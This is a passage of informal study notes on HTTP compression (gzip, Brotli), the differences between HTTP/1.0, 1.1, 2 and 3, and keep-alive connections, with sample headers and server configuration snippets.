Content-Encoding: gzip
Content-Length: 3800000  (3.8 MB)

85% saved! ✓
```

---

### Complete Example

**Multi-language API with compression**

```
REQUEST:
GET /api/products
Accept: application/json
Accept-Language: hi-IN, en-US;q=0.9
Accept-Encoding: gzip

RESPONSE:
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Language: hi
Content-Encoding: gzip
Content-Length: 4500

[Compressed JSON in Hindi]

{
  "उत्पाद": [
    {"नाम": "लैपटॉप", "कीमत": 50000}
  ]
}
```

**What Happened**:
1. Client asked JSON → Server sent JSON ✓
2. Client preferred Hindi → Server sent Hindi ✓
3. Client supports gzip → Server compressed ✓

---

## 3. HTTP Compression

### What is HTTP Compression?

**Definition**: Reducing HTTP response size using compression algorithms.

**Theory**
Compression finds patterns in data and represents them efficiently. Text (HTML, CSS, JS, JSON) compresses well. Binary (images, videos) already compressed.

---

### Why Compression?

**Problem**
```
Large JSON: 26 MB
Bandwidth: 10 Mbps
Download time: 20.8 seconds
Cost: High
```

**Solution (gzip)**
```
Original: 26 MB
Compressed: 3.8 MB (85% smaller!)
Download time: 3 seconds
Cost: 85% less
```

**Benefits**
```
✓ Faster loads
✓ Less bandwidth
✓ Lower data costs
✓ Better UX
```

---

### How Compression Works

**Simple Example**

**Original** (19 characters):
```
AAAAAAABBBBBBCCCCCC
```

**Compressed** (6 characters):
```
7A6B6C

Means: 7 A's, 6 B's, 6 C's
68% smaller!
```

**Real Example**

**Original JSON** (52 bytes):
```json
{
  "name": "Rahul",
  "name": "Rahul",
  "name": "Rahul"
}
```

**Compressed** (~20 bytes):
```
Pattern: "name": "Rahul" repeated
Store once + reference 3 times
60% smaller!
```

---

### Complete Flow

```
STEP 1: Client Request
GET /large-file.json
Accept-Encoding: gzip, deflate

STEP 2: Server Processing
Server checks:
- Client supports gzip? ✓
- File is text (JSON)? ✓
- Worth compressing? ✓

Compresses:
Original: 26 MB
Compressed: 3.8 MB

STEP 3: Server Response
HTTP/1.1 200 OK
Content-Type: application/json
Content-Encoding: gzip  ← Tells compression
Content-Length: 3980000  ← Compressed size

[Binary compressed data]

STEP 4: Browser Decompression
Browser sees: Content-Encoding: gzip
Browser: "Decompress with gzip"
[3.8 MB → 26 MB]
JavaScript receives original 26 MB ✓

STEP 5: Rendering
Page renders normally ✓
```

**Visual**
```
SERVER          INTERNET         BROWSER
  ↓                ↓                ↓
[JSON 26 MB]  [Compressed]   [Receives 3.8 MB]
  ↓                ↓                ↓
[COMPRESS]     [Transfer]     [DECOMPRESS]
gzip           Fast! ✓        gzip
  ↓                ↓                ↓
3.8 MB ────→  3.8 MB  ────→  26 MB
(85% saved!)  (85% less!)    (Original!)
```

---

### Compression Algorithms

**1. Gzip**

**Characteristics**
```
✓ Excellent support
✓ Good ratio (70-85%)
✓ Fast decompression
✗ Slower compression
✓ Default choice
```

**Example**
```
Original: 100 KB
Gzipped: 25 KB (75% reduction)
```

---

**2. Brotli (br)**

**Characteristics**
```
✓ BEST ratio (80-90%)
✓ Better than gzip
✗ Slower compression
✓ Fast decompression
✓ Modern browsers
```

**Example**
```
Original: 100 KB
Gzip: 25 KB (75%)
Brotli: 18 KB (82%) 🏆
```

**Use Cases**
```
Gzip: Dynamic content (on-the-fly)
Brotli: Static files (pre-compress)
```

---

### Compression Comparison

**File**: 1 MB HTML

```
Algorithm | Compressed | Time | Decompression
----------|------------|------|---------------
None      | 1000 KB    | 0 ms | 0 ms
Gzip      | 200 KB     | 50 ms| 10 ms
Brotli    | 150 KB     |150 ms| 12 ms
```

---

### What to Compress?

**✅ COMPRESSIBLE (Text)**

```
HTML: 500 KB → 100 KB (80%)
CSS: 200 KB → 40 KB (80%)
JavaScript: 800 KB → 200 KB (75%)
JSON: 1 MB → 200 KB (80%)
XML: 600 KB → 150 KB (75%)
SVG: 100 KB → 30 KB (70%)
```

**❌ NOT COMPRESSIBLE (Binary)**

```
JPEG: 2 MB → 1.98 MB (1% - not worth!)
PNG: 3 MB → 2.95 MB (1.6%)
MP4: 50 MB → 49.5 MB (1%)
MP3: 5 MB → 4.95 MB (1%)
ZIP: 10 MB → 10 MB (0% - already compressed!)
PDF: 2 MB → 1.96 MB (2%)
```

**Rule**
```
Text-based = Compress ✓
Binary/already compressed = Don't compress ✗
```

---

### Real Example: Website

**Instagram homepage**

```
WITHOUT COMPRESSION:
HTML: 150 KB
CSS: 300 KB
JavaScript: 1 MB
JSON: 500 KB
Images: 5 MB (don't compress)
TOTAL: 6.95 MB

10 Mbps: 5.6 seconds

──────────────

WITH COMPRESSION:
HTML: 30 KB (gzip)
CSS: 60 KB (gzip)
JavaScript: 250 KB (gzip)
JSON: 100 KB (gzip)
Images: 5 MB
TOTAL: 5.44 MB

10 Mbps: 4.4 seconds

Saved: 1.51 MB (21.7%)
Faster: 1.2 seconds ✓
```

---

### Server Setup

**Nginx**
```nginx
gzip on;
gzip_comp_level 6;
gzip_min_length 1000;
gzip_types text/plain text/css application/json application/javascript;
```

**Node.js (Express)**
```javascript
const compression = require('compression');

app.use(compression());

// Custom
app.use(compression({
  level: 6,
  threshold: 1000
}));
```

---

### Browser Handling

**Automatic**
```
Browser automatically:
1. Sends Accept-Encoding
2. Receives compressed
3. Decompresses
4. Gives original to JavaScript

Developer does nothing! ✓
```

**Check in DevTools**
```
Network tab → Request

Request Headers:
Accept-Encoding: gzip, deflate, br

Response Headers:
Content-Encoding: gzip
Content-Length: 3800

Size: 3.8 KB (transferred)
      26 KB (original)
```

---

### Summary

**Key Points**
```
✓ Compress text (HTML, CSS, JS, JSON)
✗ Don't compress binary (JPG, PNG, MP4)
✓ Gzip for dynamic
✓ Brotli for static (better)
✓ 70-85% reduction
✓ Auto browser decompression
✓ Enable on server
```

**Benefits**
```
✓ 70-85% bandwidth savings
✓ Faster loads
✓ Lower costs
✓ Better UX
```

---

## 4. HTTP Versions

### Evolution

```
HTTP/0.9 (1991) - Original
HTTP/1.0 (1996) - Headers, methods
HTTP/1.1 (1997) - Persistent, current
HTTP/2.0 (2015) - Binary, multiplexing
HTTP/3.0 (2022) - QUIC, fastest
```

---

### HTTP/1.0 (Deprecated)

**Characteristics**
```
✗ New connection each request
✗ No persistence
✗ Slow
```

**Flow**
```
Request 1:
- Open TCP
- Send GET /page1
- Receive
- Close

Request 2:
- Open TCP (AGAIN!)
- Send GET /page2
- Receive
- Close

Too many handshakes! Slow! ✗
```

---

### HTTP/1.1 (Current)

**Characteristics**
```
✓ Persistent connections (keep-alive)
✓ Pipelining
✓ Chunked transfer
✓ Better caching
✓ Widely supported
```

**Improvements**

**1. Persistent Connections**
```
Connection: keep-alive

Request 1 → Response 1 ┐
Request 2 → Response 2 │ Same TCP!
Request 3 → Response 3 ┘

Fast! ✓
```

**2. Pipelining**
```
Send all together:
Request 1 ──┐
Request 2 ──┼─→ Server
Request 3 ──┘

Responses in order
```

**3. Chunked Transfer**
```
Large file in chunks:
Chunk 1: [100 KB]
Chunk 2: [100 KB]
...

Can start rendering before complete ✓
```

---

### HTTP/2.0 (Modern)

**Characteristics**
```
✓ Binary protocol (not text)
✓ Multiplexing (parallel)
✓ Server push
✓ Header compression (HPACK)
✓ Prioritization
```

**Major Improvements**

**1. Binary Framing**
```
HTTP/1.1: Text
GET /page HTTP/1.1

HTTP/2: Binary
[Binary frames]

Benefits:
✓ Smaller
✓ Faster parse
✓ Less errors
```

**2. Multiplexing**
```
HTTP/1.1:
Conn 1: Request 1 → Response 1
Conn 2: Request 2 → Response 2
Conn 3: Request 3 → Response 3

Multiple connections!

──────────────

HTTP/2:
Same connection:
Request 1 ──┐
Request 2 ──┼─→ All parallel!
Request 3 ──┘

ONE connection! ✓
```

**Visual**
```
HTTP/1.1:
Conn 1: [=Request 1=] [Response 1]
Conn 2:     [==Request 2==] [Response 2]
Conn 3:         [=Request 3=] [Response 3]

HTTP/2:
Conn 1: [R1][R2][R3] [Res1][Res2][Res3] (parallel!)
```

**3. Server Push**
```
Browser: index.html

Server thinks:
"They'll need style.css and app.js"

Server pushes:
- index.html (requested)
- style.css (pushed)
- app.js (pushed)

Browser: "Got everything! Fast! ✓"
```

**4. Header Compression**
```
Request 1:
Host: example.com
Cookie: session=abc...
[100 bytes headers]

Request 2 (same server):
Only changed headers!
[10 bytes instead of 100!]

90% reduction! ✓
```

---

### HTTP/3.0 (Latest)

**Characteristics**
```
✓ QUIC protocol (not TCP!)
✓ Based on UDP
✓ Faster connection
✓ Better loss recovery
✓ No head-of-line blocking
```

**Major Change: QUIC/UDP**

**TCP Problem**
```
Packets: [1][2][3][4][5]

If packet 2 lost:
- 3, 4, 5 wait for 2
- Everything blocked!
- "Head-of-line blocking"
```

**QUIC Solution**
```
Stream 1: [A][B][C]  (independent)
Stream 2: [X][Y][Z]  (independent)

If B lost:
- Stream 1 waits for B
- Stream 2 continues! ✓
- No blocking!
```

**Faster Connection**
```
TCP + TLS (HTTP/2):
- TCP handshake: 3 steps
- TLS handshake: 2-3 steps
- Total: 2-3 round trips

QUIC (HTTP/3):
- Combined: 1 step
- Total: 0-1 round trip

2x faster! ✓
```

---

### Version Comparison

```
Feature       | HTTP/1.1 | HTTP/2 | HTTP/3
--------------|----------|--------|--------
Protocol      | Text     | Binary | Binary
Transport     | TCP      | TCP    | QUIC/UDP
Connections   | Multiple | One    | One
Multiplexing  | ✗        | ✓      | ✓
Compression   | ✗        | ✓      | ✓
Server Push   | ✗        | ✓      | ✓
Speed         | Slow     | Medium | Fast
Support       | 100%     | 97%    | 75%
```

---

### Performance

**Load 100 resources**

```
HTTP/1.1:
- 6 parallel connections
- 1 request at a time each
- Time: ~10 seconds

HTTP/2:
- 1 connection
- 100 parallel requests
- Time: ~3 seconds

HTTP/3:
- 1 connection
- 100 parallel
- Faster connection
- Better loss recovery
- Time: ~2 seconds
```

---

## 5. Persistent Connections

### What Are Persistent Connections?

**Definition**: Keeping TCP connection open to reuse for multiple requests.

**Theory**
Instead of opening/closing for each request, keep open and reuse. Saves time and resources.

---

### Problem in HTTP/1.0

**Old Way (No persistence)**
```
Request 1:
1. TCP handshake - 1.5 RTT
2. Send request
3. Receive response
4. Close

Request 2:
1. TCP handshake - 1.5 RTT
2. Send request
3. Receive response
4. Close

Wasteful! Slow! ✗
```

**Time wasted**
```
100 requests = 100 handshakes
Each = ~100ms
Total: 10 seconds wasted!
```

---

### Solution: Keep-Alive

**New Way (HTTP/1.1 default)**
```
Connection: keep-alive

1. TCP handshake (once)
2. Request 1 → Response 1
3. Request 2 → Response 2  (same!)
4. Request 3 → Response 3  (same!)
...
100. Request 100 → Response 100
101. Close (after idle timeout)

One handshake for 100! ✓
```

---

### Keep-Alive Parameters

**Format**
```
Connection: keep-alive
Keep-Alive: timeout=5, max=100
```

**Parameters**

**timeout**: Idle time before close (seconds)
```
Keep-Alive: timeout=5

After last request:
- Wait 5 seconds
- No new request? Close
```

**max**: Max requests per connection
```
Keep-Alive: max=100

After 100 requests:
- Close connection
- Open new if needed
```

---

### Complete Flow

```
STEP 1: First Request
Client → Server: TCP handshake
Client → Server:
  GET /page1
  Connection: keep-alive

Server → Client:
  200 OK
  Connection: keep-alive
  Keep-Alive: timeout=5, max=100

Connection stays open ✓

STEP 2: Second (1 sec later)
(Reuse connection, no handshake!)

Client → Server:
  GET /page2
  Connection: keep-alive

Server → Client:
  200 OK

Still open ✓

STEP 3: Idle 5 seconds
No requests...

Server: "Timeout! Close"
Connection closed ✓

STEP 4: New Request
Client → Server: New TCP handshake
New persistent connection ✓
```

---

### Connection: close

**Definition**: Close after this response.

**Use Cases**
- Want to end connection
- Error occurred
- Resource cleanup

**Example**
```
REQUEST:
GET /api/data
Connection: close

"Close after this"

RESPONSE:
200 OK
Connection: close

Connection closed immediately ✓
```

---

### Benefits

```
Performance:
✓ No repeated handshakes
✓ Faster subsequent requests
✓ Lower latency

Resources:
✓ Less CPU (fewer handshakes)
✓ Less network overhead
✓ Better capacity

UX:
✓ Faster loads
✓ Smoother browsing
```

**Numbers**
```
100 requests with new connections:
- 100 handshakes × 100ms = 10 seconds

100 with persistent:
- 1 handshake × 100ms = 0.1 seconds
- Saved: 9.9 seconds! ✓
```

---

### Modern HTTP

**HTTP/1.1**
```
Connection: keep-alive (default)
6 parallel persistent connections
```

**HTTP/2**
```
Always persistent
Single connection
Multiplexing!
```

**HTTP/3**
```
Always persistent
QUIC-based
Even better!
```

---

## Final Summary

### Complete HTTP Flow

```
1. User types URL
2. DNS lookup (get IP)
3. TCP connection (3-way handshake)
4. TLS handshake (if HTTPS)
5. HTTP request (with headers)
6. Firewall check
7. Proxy (Nginx) routes
8. Backend processes (Spring Boot)
9. Database query
10. HTTP response (with headers)
11. Browser renders
```

### Key Concepts

**Protocol Basics**
```
✓ Stateless (no memory)
✓ Client-Server model
✓ Request-Response cycle
```

**Security**
```
✓ HTTPS = HTTP + TLS
✓ Certificates verify identity
✓ Public/Private key encryption
```

**Methods**
```
GET - Fetch
POST - Create
PUT - Replace all
PATCH - Update partial
DELETE - Remove
```

**Status Codes**
```
2xx - Success
3xx - Redirect
4xx - Client error
5xx - Server error
```

**Performance**
```
✓ Caching (max-age, ETag)
✓ Compression (gzip, brotli)
✓ Persistent connections
✓ HTTP/2 multiplexing
```

**CORS**
```
✓ Same-Origin Policy
✓ Simple requests (no pre-flight)
✓ Pre-flight (OPTIONS first)
✓ Access-Control headers
```

---

**This completes all HTTP notes! 🎉**
